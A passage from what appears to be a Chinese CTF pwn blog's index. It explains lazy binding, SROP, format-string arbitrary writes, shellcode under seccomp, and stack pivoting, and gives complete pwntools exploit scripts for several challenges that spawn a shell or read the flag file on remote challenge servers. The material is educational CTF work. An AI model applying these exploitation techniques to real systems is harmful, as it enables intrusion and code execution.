，这是因为 sk_buff 后续在调用网络层，最后到达网卡发送完成的时候，这个 sk_buff 会被释放掉。而 TCP 协议是支持丢失重传的，在收到对方的 ACK 之前，这个 sk_buff 不能被删除。所以内核的做法就是每次调用网卡发送的时候，实际上传递出去的是 sk_buff 的一个拷贝，等收到 ACK 再真正删除。\n为了在层级之间传递数据时，不发生拷贝，只用 sk_buff 一个结构体来描述所有的网络包，那它是如何做到的呢？是通过调整 sk_buff 中 data 的指针\n","categories":["基础"]},{"title":"延迟绑定及利用","url":"/2023/03/28/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%8F%8A%E5%88%A9%E7%94%A8/","content":"前言通常来说 我们想要通过A函数来调用B函数 最常用的办法是覆盖函数A的got表 \n但是这种做法存在一种弊端 这里我们先不提及 在下面会逐渐揭示 我们先来了解一下函数的动态链接到底是怎么实现的\n原理分析我们知道 对于一个c语言程序来说 其从.c文件编译成为一个可执行文件 一共需要四个步骤\n分别是预处理 编译 汇编 链接 这里这把链接展开说\n链接分为静态链接和动态链接 这里的静态动态是对于函数的调用来说的\n静态链接出来的二进制文件通常是要大于动态链接的 是因为其包括了完整的静态库\n而动态链接则是在程序运行时 再去通过操作系统自带的动态链接库索引\n这种操作称之为延迟绑定 延迟绑定的实现主要是由plt表 got表 got.plt表这三个实现\n全局偏移表是对got表和got.plt表的统称 其中got表存放供外部变量引用的地址 got.plt表则是延迟绑定利用的关键 存放外部函数引用的地址\ngot.plt表相当于一个数组 其固定拥有三个元素 从0到2分别占据数组 依次存放\ndynamic段的地址  本模块的ID _dl_runtime_resolve函数的地址\ndynamic段供动态链接器提取动调链接信息  ID则是用来索引不同的函数 dl_runtime_resolve负责解析出函数的真实地址\n\n接下来看一下一个函数是如何进行延迟绑定 获取到真实地址的\n对于一个函数来说 在其还没有被第一次调用前 其存储的是.plt表上的地址\n\n以puts函数为例\n\n这里的0x0就是其模块ID 随后跳转到0x401020上\n\n在这里索引到全局偏移表中的GOT[1] 在这里压入模块ID\n\n随后通过_dl_runtime_resolve函数获取到真实地址\n\n随后根据模块ID 放入GOT数组中对应位置\n实操演示上面说到过 通过覆盖got表来实现函数误导调用有一种弊端 就是在我们下面这种办法的利用中 必须选择延迟绑定的利用方法 跟着我来看一下吧\n所选例题是NKCTF2023的only_read libc版本为2.31 9.9\n\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char s1[64]; // [rsp+0h] [rbp-80h] BYREF  char s[64]; // [rsp+40h] [rbp-40h] BYREF  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  setbuf(stderr, 0LL);  memset(s, 0, sizeof(s));  memset(s1, 0, sizeof(s1));  read(0, s, 0x30uLL);  base_decode(s, s1);  if ( strcmp(s1, &quot;Welcome to NKCTF!&quot;) )    return 0;  memset(s, 0, sizeof(s));  memset(s1, 0, sizeof(s1));  read(0, s, 0x30uLL);  base_decode(s, s1);  if ( strcmp(s1, &quot;tell you a secret:&quot;) )    return 0;  memset(s, 0, sizeof(s));  memset(s1, 0, sizeof(s1));  read(0, s, 0x40uLL);  base_decode(s, s1);  if ( strcmp(s1, &quot;I&#x27;M RUNNING ON GLIBC 2.31-0ubuntu9.9&quot;) )    return 0;  memset(s, 0, sizeof(s));  memset(s1, 0, sizeof(s1));  read(0, s, 0x40uLL);  base_decode(s, s1);  if ( !strcmp(s1, &quot;can you find me?&quot;) )    next();  return 0;&#125;\n\n为了不通过puts等输出函数来书写字符串 利用strcmp函数来对比base64加解密的字符串 这里就不解释了\n来看一下next函数\nssize_t next()&#123;  char buf[48]; // [rsp+0h] [rbp-30h] BYREF  return read(0, buf, 0x200uLL);&#125;\n\n很明显的栈溢出漏洞 但是难点在于说没有给任何的输出函数 也就是说没有办法泄露libc地址(实际上是可以的 覆盖got表爆破 但是这里不用这种办法)\n这种情况极大程度上限制了我们的利用 不过还是可以通过Srop的方法来getshell\n为了促成srop 我们就需要使得控制rax寄存器的值为15 随后syscall系统调用 但是这题没有直接给控制rax的指令 这个时候我们要联想到 大部分函数执行完都是有返回值的 而这个返回值就是用rax寄存器存储的 这里采用read函数来控制rax寄存器 那么syscall要如何解决呢 这题同样也是没有syscall函数的\n不知道你有没有s进入read函数中看其是如何调用的 实际上read函数是通过syscall实现的\n\n同时注意一下 syscall和read函数的起始地址 只差在倒数第二位 \n\n如果我们覆盖read函数的got表 执行read函数就相当于执行syscall 但是此时read函数也就相当于废掉了 相当于syscall了 我们还怎么利用read函数来控制rax寄存器呢\n这个时候就用到延迟绑定了 我们直接把其他函数的got表改为read函数在plt表上的地址 这样就相当于再次延迟绑定一次 也就相当于调用了read函数  不过这样子会使得read函数的got表恢复为原来的值 需要我们重新留覆盖一下\nfrom pwn import*from ctypes import *from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;ctf.comentropy.cn&quot;,8301)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#libc = ELF(&quot;./libc-2.32.so&quot;)#libc = ELF(&quot;./locate&quot;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug():    gdb.attach(io)    pause()io.send(b&quot;V2VsY29tZSB0byBOS0NURiE=&quot;)sleep(0.1)io.send(b&quot;dGVsbCB5b3UgYSBzZWNyZXQ6&quot;)sleep(0.1)io.send(b&quot;SSdNIFJVTk5JTkcgT04gR0xJQkMgMi4zMS0wdWJ1bnR1OS45&quot;)sleep(0.1)io.send(b&quot;Y2FuIHlvdSBmaW5kIG1lPw==&quot;)rdi_addr = 0x0000000000401683rsi_r15_addr = 0x0000000000401681ret_addr = 0x000000000040101aleave_addr = 0x00000000004013c2next_addr = elf.sym[&#x27;next&#x27;]bss_addr = elf.bss(0x600)rsp_r13_r14_r15_addr = 0x000000000040167dpayload = cyclic(0x38)+p64(rdi_addr)+p64(0)payload += p64(rsi_r15_addr)+p64(elf.got[&#x27;memset&#x27;])+p64(0)+p64(elf.plt[&#x27;read&#x27;])payload += p64(rdi_addr)+p64(0)payload += p64(rsi_r15_addr)+p64(bss_addr)+p64(0)+p64(elf.plt[&#x27;memset&#x27;])payload += p64(rsp_r13_r14_r15_addr)+p64(bss_addr-0x10)# gdb.attach(io,&#x27;b *0x4013E8&#x27;)# pause(0)io.send(payload)sleep(0.1)payload = p64(0x401050)+b&#x27;\\xd0&#x27;# gdb.attach(io,&#x27;b *&#x27;+str(rsi_r15_addr))# pause(0)io.send(payload)sleep(0.1)frame = SigreturnFrame()frame.rax = 59frame.rsi = 0frame.rsi = 0frame.rdi = bss_addrframe.rip = elf.plt[&#x27;read&#x27;]payload = b&#x27;/bin/sh\\x00&#x27;+p64(rdi_addr)+p64(0)payload += p64(rsi_r15_addr)+p64(elf.got[&#x27;memset&#x27;]-0x6)+p64(0)+p64(elf.plt[&#x27;memset&#x27;])payload += p64(elf.plt[&#x27;read&#x27;])+bytes(frame)# gdb.attach(io,&#x27;b *&#x27;+str(rsp_r13_r14_r15_addr))# pause(0)io.send(payload)sleep(0.1)payload = cyclic(0x6)+p64(0x401050)+b&#x27;\\xd0&#x27;# gdb.attach(io,&#x27;b *&#x27;+str(elf.plt[&#x27;read&#x27;]))# pause(0)io.send(payload)io.interactive()\n\n","categories":["栈"]},{"title":"手写格式化字符串payload","url":"/2023/03/14/%E6%89%8B%E5%86%99%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2payload/","content":"漏洞分析万万没想到直到学习了pwn五个月以后 我才开始学习手写格式化字符串payload 先前都是习惯利用了fmstr_payload来构造了 但是直到遇到了一道题 要在一次格式化字符漏洞中 利用两次 fmstr_payload构造出来的payload无法达到预期的攻击效果 所以只能自己手写了\n来复习一下格式化字符串任意写漏洞的原理\n利用了%n可以根据已经输出的字节修改对应偏移处地址的值\n不过先前我们学习过的任意写 只是简单的将一个地址处的值修改为个位数大小 所需要的字节数很小 如果我们想要修改got表的值为后门函数呢 这要如何实现 总不可能传输同等大小的字节数吧\n这时候引入一个新的格式化字符 %c  其有什么效果呢 我们编写下面一段小程序\n#include &lt;stdio.h&gt;int main()&#123;      char a[20]=&quot;test&quot;;      printf(&quot;%c&quot;,a[0]);&#125;\n\n%c 可以输出单个字符 所以此时的运行结果应该是单个字符t\n\n如果像%s之类的格式化字符 在前面加上数字呢 又有什么效果?\n#include &lt;stdio.h&gt;int main()&#123;      char a[20]=&quot;test&quot;;      printf(&quot;%10c&quot;,a[0]);&#125;\n\n\n可以看到最后的结果在实际输出的字符t前面 还加上了9字节的\\x00 也就是会自动补全我们输出的字符\n而其占用的字节数也很小 哪怕是%0x10000c 所占用的字节数也只为9\n这就使得哪怕题目限制了我们利用格式化字符漏洞的payload的字节数 我们仍然可以保证任意写的攻击\n但是这仍然不够完美 我们还有没有更好的办法来修改got表这样的地址其值\n我们来看一下函数的got表 在32位情况下 其存储的值是如何占用这四个字节\n\n可以看到是小端序存储 并且一个字节对应着两个数字\n那么比如说printf函数中的got表  高位的0x08 对应的地址为0x804989c + 3\n如果我们只需要修改高位的值 就可以往这个地址写入单字节 利用 ‘h’来构造格式化字符\npayload = &quot;%&quot;+str(要修改的值).encode()+&quot;c%偏移$hhn&quot;payload += p64(地址)\n\n实例分析下面利用一道国赛题来帮助理解\n[CISCN 2019西南]PWN1\n查看一下保护机制\n\n没有开启Partical RELRO 或者是Full RELRO 那么可以fini_array处就有可写的权限 \nida看一下伪代码\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char format[68]; // [esp+0h] [ebp-48h] BYREF  setvbuf(stdin, 0, 2, 0);  setvbuf(stdout, 0, 2, 0);  puts(&quot;Welcome to my ctf! What&#x27;s your name?&quot;);  __isoc99_scanf(&quot;%64s&quot;, format);  printf(&quot;Hello &quot;);  printf(format);  return 0;&#125;\n\n同时还提供了system函数\n只有一次格式化字符串的机会 既然可以修改fini_array 那么我们首先想到的就是利用格式化字符串漏洞 将fini_array修改为main函数的地址\n不过实际攻击效果和我预期的有点不一样 在第二次执行完main函数以后就没有办法再次返回了 估计是栈空间不够的锅 那没办法 就只能在第一次格式化字符串的时候就同时修改fini_array和printf函数的got表\n就是这里 利用fmstr_payload构造出来的payload无法达到预期的攻击效果 所以我们采用手写的方式\n首先是计算一下偏移 这个就不详细展开了 最后发现的偏移是4\nfini_addr = 0x804979Cmain_addr = 0x8048534printf_got = 0x804989csystem_addr = 0x80483d0payload = b&#x27;%&#x27;+str(0x0804).encode()+b&#x27;c%15$hn&#x27;payload += b&#x27;%16$hn&#x27;payload += b&#x27;%&#x27;+str(0x83d0-0x0804).encode()+b&#x27;c%17$hn&#x27;payload += b&#x27;%&#x27;+str(0x8534-0x83d0).encode()+b&#x27;c%18$hnaa&#x27;payload += p32(fini_addr+2)payload += p32(printf_got+2)payload += p32(printf_got)payload += p32(fini_addr)\n\n首先我们要清楚一点 如果单次格式化字符利用想要修改多个地址值 那么后面需要修改的值一定是要大于前面的\n因为前面%c输出的空字符 也算到后面的总字节数里面的 为了防止修改的值超出预期 所以需要把较大的数值安排到后面\n还有一点是为什么要用str().encode()的形式 是因为python3 byte型和字符型的要求\n完整exp:\nfrom pwn import*from LibcSearcher import*#io = process(&quot;./pwn&quot;)io = remote(&quot;1.14.71.254&quot;,28573)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.arch = &quot;i386&quot;elf = ELF(&quot;./pwn&quot;)def debug():    gdb.attach(io)    pause()fini_addr = 0x804979Cmain_addr = 0x8048534printf_got = 0x804989csystem_addr = 0x80483d0io.recvuntil(&quot;Welcome to my ctf! What&#x27;s your name?&quot;)payload = b&#x27;%&#x27;+str(0x0804).encode()+b&#x27;c%15$hn&#x27;payload += b&#x27;%16$hn&#x27;payload += b&#x27;%&#x27;+str(0x83d0-0x0804).encode()+b&#x27;c%17$hn&#x27;payload += b&#x27;%&#x27;+str(0x8534-0x83d0).encode()+b&#x27;c%18$hnaa&#x27;payload += p32(fini_addr+2)payload += p32(printf_got+2)payload += p32(printf_got)payload += p32(fini_addr)print(len(payload))io.sendline(payload)io.recvuntil(&quot;Welcome to my ctf! What&#x27;s your name?&quot;)payload = b&#x27;/bin/sh&#x27;io.sendline(payload)io.interactive()\n\n","categories":["栈"]},{"title":"极客大挑战 2019 Not Bad","url":"/2023/02/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Not-Bad/","content":"手写shellcode 但是比较简单 记录一下思路\n保护机制\n[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x400000)    RWX:      Has RWX segments\n\nida看一下\n__int64 __fastcall main(int a1, char **a2, char **a3)&#123;  mmap((void *)0x123000, 0x1000uLL, 6, 34, -1, 0LL);  seccomp();  buffer();  vuln();  return 0LL;&#125;\n\nmmap开辟了一块内存 地址从0x123000 - 0x124000 权限是可写可执行\n还有三个函数 跟进一下看看\n__int64 seccomp()&#123;  __int64 v1; // [rsp+8h] [rbp-8h]  v1 = seccomp_init(0LL);  seccomp_rule_add(v1, 2147418112LL, 0LL, 0LL);  seccomp_rule_add(v1, 2147418112LL, 1LL, 0LL);  seccomp_rule_add(v1, 2147418112LL, 2LL, 0LL);  seccomp_rule_add(v1, 2147418112LL, 60LL, 0LL);  return seccomp_load(v1);&#125;\n\n开沙盒了 看看限制了啥\n line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0010: 0x06 0x00 0x00 0x00000000  return KILL\n\n只能允许open read write三个函数 那就是orw了\n接着跟进下一个函数\nvoid buffer()&#123;  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  setbuf(stderr, 0LL);&#125;\n\n清空了缓存区 这个没啥好说的 跟进下一个函数\nint vuln()&#123;  char buf[32]; // [rsp+0h] [rbp-20h] BYREF  puts(&quot;Easy shellcode, have fun!&quot;);  read(0, buf, 0x38uLL);  return puts(&quot;Baddd! Focu5 me! Baddd! Baddd!&quot;);&#125;\n\n给了一次0x10字节栈溢出的机会 这种情况下大概率就是手写shellcode了 应该是有哪个地方给了jmp rsp指令 ropgadget找一下\nchen@chen-virtual-machine:~$ ROPgadget --binary pwn --only &#x27;jmp|rsp&#x27;Gadgets information============================================================0x00000000004002d8 : jmp 0x4002ad0x000000000040078b : jmp 0x4007700x00000000004008eb : jmp 0x4008800x0000000000400b03 : jmp 0x400b7a0x0000000000400b87 : jmp qword ptr [rax - 0x68000000]0x0000000000400ceb : jmp qword ptr [rbp]0x0000000000400865 : jmp rax0x0000000000400a01 : jmp rspUnique gadgets found: 8\n\n果然有一个 不过由于0x10还要算上jmp rsp 那么给shellcode的字节就只有8字节了 这显然是啥也干不了的 gdb动调看了下寄存器 都要我们重新赋值 这个时候可以利用sub rsp来往上抬栈 从而使得原本是用垃圾数据填充的部分可以被我们利用起来\n完整exp:\nfrom pwn import *context.log_level = &#x27;debug&#x27;#io=process(&#x27;./pwn&#x27;)io = remote(&quot;node4.buuoj.cn&quot;,26981)elf = ELF(&#x27;./pwn&#x27;)#libc = ELF(&#x27;./locate&#x27;)libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)context.arch = &quot;amd64&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]jmp_rsp = 0x400A01magic_addr = 0x123000io.recvuntil(&quot;Easy shellcode, have fun!&quot;)shellcode = &quot;&quot;&quot;xor eax,eaxxor edi,edimov edx,200mov rsi,0x123500syscalljmp rsi&quot;&quot;&quot;shellcode2 = &quot;&quot;&quot;sub rsp,0x30jmp rsp&quot;&quot;&quot;payload = asm(shellcode).ljust(0x28,b&#x27;\\x00&#x27;)+p64(jmp_rsp)+asm(shellcode2)# gdb.attach(io,&#x27;b *0x400A4A&#x27;)# pause(0)io.send(payload)shellcode3 = asm(shellcraft.open(&#x27;./flag&#x27;))shellcode3 += asm(shellcraft.read(3,magic_addr+0x50,0x50))shellcode3 += asm(shellcraft.write(1,magic_addr+0x50,0x50))io.send(shellcode3)io.recv()io.recv()io.recv()\n\n","categories":["wp"]},{"title":"栈溢出-特殊情况","url":"/2022/10/03/%E6%A0%88%E6%BA%A2%E5%87%BA-%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5/","content":"本篇博客用来记录一种特殊的情况\n直接上例题吧 看完就知道什么意思了\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char v4[56]; // [esp+4h] [ebp-38h] BYREF  printf(&quot;Qual a palavrinha magica? &quot;, v4[0]);  gets(v4);  return 0;&#125;\n\nvoid __cdecl get_flag(int a1, int a2)&#123;  int v2; // esi  unsigned __int8 v3; // al  int v4; // ecx  unsigned __int8 v5; // al  if ( a1 == 814536271 &amp;&amp; a2 == 425138641 )  &#123;    v2 = fopen(&quot;flag.txt&quot;, &quot;rt&quot;);    v3 = getc(v2);    if ( v3 != 255 )    &#123;      v4 = (char)v3;      do      &#123;        putchar(v4);        v5 = getc(v2);        v4 = (char)v5;      &#125;      while ( v5 != 255 );    &#125;    fclose(v2);  &#125;&#125;\n\n总体的思路应该就是最简单的栈溢出控制程序执行流到getflag这个函数\n但是getflag在open flag.txt前有一个if判定 我们要先使a1 a2的值符合这个条件 才能使函数正常运行\n但是这个a1 a2我们发现也没有办法通过栈溢出的方法来覆盖使其变成符合条件的值\n所以这里只能在调用getflag函数时 一并传入a1 a2的值\nexp如下：\nfrom pwn import*io = remote(&quot;node4.buuoj.cn&quot;,29661)getflag_addr = 0x80489a0exit_addr = 0x804e6a0payload = cyclic(0x38)+p32(getflag_addr)+p32(exit_addr)+p32(0x308CD64F)+p32(0x195719D1)io.sendline(payload)io.interactive()\n\n这里你会发现 按照平常我们填充的垃圾数据应该是 变量到ebp的距离0x38+0x4来覆盖ebp\n这里为什么我们没有多一个字长的垃圾数据呢？\n来看一下main函数的汇编情况\n\n是不是缺少了什么？ 如果你对栈帧的概念不是很清楚 可能看不出什么 我们再放一段正常的函数汇编代码\n\n如果你熟悉栈帧的概念(这个我们在ret2csu里有讲到) 你就会知道大部分栈帧在生成的时候都会有这两段汇编代码 用来使esp和ebp入栈\n但是这道题的getflag函数并没有ebp 他利用esp寻址的办法\n所以此时我们的变量距离ret addr只有0x38字节 而非0x38+4\n再说回为什么函数和参数之间的垃圾数据要为exit函数的地址\n这是因为程序如果是以异常状况结束的 那么他将不会有回显 也就是说open(flag)得到的flag并不会显示出来\n","categories":["栈"]},{"title":"栈迁移","url":"/2022/09/26/%E6%A0%88%E8%BF%81%E7%A7%BB/","content":"我们在基础知识扩展的时候，说到了为了避免有些题目供我们构造的字节数过少，以至于无法给system函数传参的时候该怎么解决\n今天所要讲到的内容，也是和栈溢出字节数不够有关\n当可以供我们编写的字节数仅够覆盖到ret addr时，并且该程序内并没有后门函数可以供我们利用，我们又该如何实现系统调用呢？\n我们以往的简单栈溢出是通过覆盖ret addr的办法控制程序执行流导向后门函数的位置\n但是其本质上 ebp和esp并没有被我们所控制，他仍然是按照原先栈底的汇编代码所运行的\n所以我们换个思路？不妨劫持esp和ebp，让他们前往bss段或者其他可以供我们自由写入的区\n这样我们就可以自己构建一个后门函数，并且将程序执行流引导至其\n那问题就来到了如何劫持esp和ebp 我们先得清楚一下栈帧这个概念\n栈帧栈帧也叫过程活动记录，是编译器用来实现函数调用过程的一种数据结构\n简单理解就是每次函数的调用，都会生成自己的栈帧\n栈帧就相当于函数的调用框架，包含了函数的参数，函数的局部变量，函数执行完后的返回地址\n系统是如何定义一个栈帧的？ebp指向了栈帧的栈底，esp指向了函数的栈顶\n也就是说，我们把esp和ebp劫持的目的，就是让系统错以为我们写入shellcode的bss段(包括但不限)是一个栈帧\n从而执行他\n栈迁移原理归根到底，就是要如何劫持esp和ebp\n回到我们最开始的栈溢出，我们要溢出的字节数&#x3D;变量var距离esp的字节数+一个字长\n这里的一个字长覆盖的是ebp\n在我们没有对ebp覆盖的时候，其保存的是上层函数的栈底地址，而ret addr保存的是上层函数执行到了哪个地方，方便子函数结束后返回父函数最后执行的地方\n在一个栈帧结束的时候，eip 即将执行 leave 与 ret 两条指令恢复现场(即返回父函数)\nleave指令相当于 mov esp ebp和pop ebp\n他将ebp和esp指向同一地址，这一步相当于腾出了栈帧空间\n随后pop ebp 将此时esp指向的old ebp(因为我们上面说过了嘛，ebp保存的是上层函数的栈底地址)赋值给真正的ebp(此时的ebp是定义栈帧栈底的ebp)\n是不是有点晕？首先你要分清楚ebp保存的内容和ebp寄存器这两个概念\n在子函数调用开始之前，系统会将父函数栈底的地址弹出到新的栈帧，这个值就是ebp(就是我们之前栈溢出用垃圾数据覆盖的那个嘛)\n然后记录下当前父函数运行到的地址，将其弹出为ret addr，等子函数结束以后，就会返回到这个地址\n所以说，如果我们覆盖ebp的时候不用垃圾数据，而是放入我们要使ebp迁移到的地址，那么ebp就会被我们挟持走\n但是此时还有个esp寄存器怎么办？栈帧的空间需要这二者才能定义\n你还记不记得我们构造rop链的手法？我们自己再找一个leave的汇编代码地址然后覆盖ret addr不就好了？\n此时mov esp ebp会起到什么效果？ebp已经指向了我们要迁移的地址，所以esp也被挟持到了那边\n但是注意，还有一句pop ebp 虽然这句没有任何作用，因为此时新的栈帧的栈顶，其保存的已经是我们要挟持到的地方的地址\n但是这一句是出栈指令，此时我们的esp，他指向的地址就会增加一个字长\n\n如图所示，HijackAddr就是我们想要劫持esp ebp到的地址\n那栈迁移运作的原理我们已经搞清楚了是吧，接下来想办法构造payload\npayload &#x3D; cyclic(offset)+pxx(addr)+pxx(leave_addr)\n这一个没有问题吧\n那只剩下最后一个问题了，我们迁移到的那个地址的栈内容要怎么编写\n\naaaa是我们最开始的那个地址存放的垃圾数据，即上文说到的HijackAddr,因为pop ebp的原因，esp会指向高一个字长的地方\ndddd则是32位情况下的传参，中间要隔个垃圾数据，这没什么好说的\n下一个binsh_addr 和binsh字符串是什么意思，当程序连binsh都没给我们的话，反正我们都能自己编写一段栈帧了，我们不是可以自己写入一段binsh，然后我们也知道其地址了，不是就能调用了\n后面的old_ebp和ret_addr也没什么好说的，就是一段栈帧必须的要素\n","categories":["栈"]},{"title":"格式化字符串基础漏洞","url":"/2022/09/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/","content":"格式化字符串漏洞原理printf应该是我们学习c语言起使用的最频繁的函数了\n其语法我们熟悉的不能再熟悉了—&gt;printf (“格式化字符串”,参量… )\n我们可以写一段代码：\n#include &lt;stdio.h&gt;int main()&#123;  int n=5;  printf(&quot;%d&quot;,n);  return 0;&#125;\n\n当然我们也可以这样写：\n#include &lt;stdio.h&gt;int main()&#123;  char a[]=&quot;chen&quot;;  printf(a);  return 0;&#125;\n\n第二种写法虽然没有格式化字符但是仍然可以输出chen这个字符串\n那我们再看看第三种写法\n#include &lt;stdio.h&gt;int main()&#123;  char a[]=&quot;%x%x%x&quot;;  printf(a);  return 0;&#125;\n\n这次我们没有给printf函数参数，只是仅仅给他格式化字符，猜一下，这次能成功吗，如果成功了，会输出什么？\n\n输出了像地址的16进制？\n我们明明没有给他用以输出的参数，那么这串数据是从哪里来的？\n我们用图来表示一下printf输出的时候栈结构是什么样子\n\nps:关于这图，格式化字符串不一定要放在栈顶才能实现任意地址写入，注意别被误导了，下面会提一嘴\n如果我们只传入了格式化字符串而没有传入参数\n那么格式化字符串仍然会遵循着原先的逻辑，向高地址处逐个字长的输出当前栈的内容&#x2F;指针(输出的方式根据其格式化字符的不同而不同)\n这是因为printf函数并不知道参数个数，它的内部有个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束\npwn题中的格式化字符串通常有两种出法\n第一种，使用格式化字符串泄露栈上的内容(canary或者是随机数不一定)，由于wp分类中的HUBU2022.fmt已经是这方面的例题了，这里不做额外的讲解，感兴趣的可以去wp分区中自行查看\n第二种，也是难度较前者稍高，不好理解的一种\n任意内存的读取及任意内存写入我们首先得了解一个不常用的格式化字符串**%n**\n他的作用是将在其之前打印出来的字节数赋值给指定的变量\n比如: AAAA%n 就会赋值4给变量\n如果我们后面跟上要修改的变量地址，就可以做到任意地址的写入\n没懂？没关系来看一道例题\n\n开了canary保护，大概率是格式化字符串\n看看ida\nint __cdecl main(int a1)&#123;  unsigned int v1; // eax  int result; // eax  int fd; // [esp+0h] [ebp-84h]  char nptr[16]; // [esp+4h] [ebp-80h] BYREF  char buf[100]; // [esp+14h] [ebp-70h] BYREF  unsigned int v6; // [esp+78h] [ebp-Ch]  int *v7; // [esp+7Ch] [ebp-8h]  v7 = &amp;a1;  v6 = __readgsdword(0x14u);  setvbuf(stdout, 0, 2, 0);  v1 = time(0);  srand(v1);  fd = open(&quot;/dev/urandom&quot;, 0);  read(fd, &amp;dword_804C044, 4u);  printf(&quot;your name:&quot;);  read(0, buf, 0x63u);  printf(&quot;Hello,&quot;);  printf(buf);  printf(&quot;your passwd:&quot;);  read(0, nptr, 0xFu);  if ( atoi(nptr) == dword_804C044 )  &#123;    puts(&quot;ok!!&quot;);    system(&quot;/bin/sh&quot;);  &#125;  else  &#123;    puts(&quot;fail&quot;);  &#125;  result = 0;  if ( __readgsdword(0x14u) != v6 )    sub_80493D0();  return result;&#125;\n\n这里的&#x2F;dev&#x2F;urandom是什么？\n我们只需要了解他是linux系统中的随机伪设备，他的作用就是提供永不为空的随机字节流\n浅看一下他生成的字节流长什么样子\n\n说回这道题，看逻辑应该是要我们输入这个随机数，如果一样就调用system(&#x2F;bin&#x2F;sh)\n而存放这个随机数的就是dword_804C044的地址\n那我们这时候应该有两种想法，一种是泄露这个随机数，输入他\n还有一种是通过修改这个随机数的值来判定成功\n第一种办法本人是没法做出来，感兴趣的可以试一试\n那么讲一下第二种办法，由上文的学习我们已经知道\n要想用格式化字符串漏洞泄露栈上的内容，需要我们知道目标地址和格式化字符串存放的地址的偏移\n用gdb看一下偏移\n\n现在main函数处设置一个断点(这里由于main函数被删符号表了，所以b main的话gdb查找不到函数的，删符号表的体现就是在ida中main函数不是粗体字，ida只是凭借逻辑识别他为main函数)\n\n接着运行并且跳转到输入字符串这边，我们先输入8个A看一下栈分布的情况\n\n这里还是先解释一下x&#x2F;20wx $esp这个命令是什么意思\n其作用是用gdb查看内存 格式: x &#x2F;n u f  \nn是要显示的内存单元个数\nf表示显示方式, 可取如下值\nu表示一个地址单元的长度\n这里的x&#x2F;20wx 的意思就是说查看20个4字节长度的内存单元 并且按16进制的格式显示\n至于为什么是以esp为初始地址显示\n是因为格式化字符串%n进行任意地址改写是在ESP所指向的地址处所指向的地址处写入数据(可以理解为栈顶)\n所以我们需要知道当我们最终构造的payload中需要改写的地址内容距离esp的偏移是多少\n而且也正是因为这一点，决定了我们可以不用一定要把格式化字符串放在栈顶\n这里可以看到代表着AAAAAAAA的两个0x4141414141距离esp的偏移是10和11(如果我们只输入4个A只会占用偏移10这个字长，因为这是32位程序，等下编写exp的不要被搞晕了)\n所以此时我们要如何构造我们的payload？\n此时我们将格式化字符放在payload的最后\nfrom pwn import *io = remote(&quot;node4.buuoj.cn&quot;,25117)context.log_level = &quot;debug&quot;addr = 0x0804C044payload = p32(addr)+b&quot;%10$n&quot;io.sendline(payload)io.sendline(&quot;4&quot;)io.interactive()\n\n由于此时程序是32位，%n前面传入的p32(addr)则为一个字长，四个字节，所以此时addr处的随机数就被我们修改为4\n我们接着再输入4，就成功破解了随机数\n学会了？觉得很简单？再来看一个比较绕的exp\nfrom pwn import *io = remote(&quot;node4.buuoj.cn&quot;,25117)context.log_level = &quot;debug&quot;addr = 0x0804C044payload = b&quot;AAAAAAA%13$n&quot;+p32(addr)io.sendline(payload)io.sendline(&quot;7&quot;)io.interactive()\n\n这次我们把addr放在后面传输了，可以看到和上文的区别是前面多了7个A而且这次随机数被我们修改成7了\n看不懂没关系，接下来详解\n我们再次明确一下概念，这里提到的偏移指的是距离esp的字长数\n那么我们要实现改写的是addr这个地址的随机数对吧\n此时我们先传入的是字符串“AAAAAAA%13$n”他的字节数是多少？\n很明显是12个字节，也就是三个字长\n我们之前通过gdb已经明白了，我们写入栈中的第一个字长是位于10偏移处，也就是AAAA\n那么接下里的AAA%就会被写入11偏移\n13$n就会被写入12偏移\n而此时的addr就会被存放在13偏移处，所以此时我们的n就要从10更改为13\n似乎有点能理解了是吧？\n实际上pwntools中有一个函数，他可以自动帮我们生成这样的payload，而我们要做到的只是给予他基本的参数\nfmtstr_payload(offset, {addr: 